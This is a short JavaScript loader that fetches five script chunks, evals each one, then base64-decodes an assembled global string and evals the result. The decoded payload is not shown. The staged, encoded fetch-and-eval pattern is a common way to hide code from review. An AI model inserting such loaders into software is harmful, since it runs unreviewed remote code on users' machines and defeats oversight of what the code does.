window.S3='';
['s3c1.js','s3c2.js','s3c3.js','s3c4.js','s3c5.js'].forEach(function(f){
  var x=new XMLHttpRequest();
  x.open('GET',f,false);
  x.send(null);
  if(x.status>=200&&x.status<300){eval(x.responseText);}else{throw new Error('Unable to load '+f);}
});
(function(){
  var bytes=Uint8Array.from(atob(window.S3),function(c){return c.charCodeAt(0);});
  var code=new TextDecoder('utf-8').decode(bytes);
  eval(code);
})();
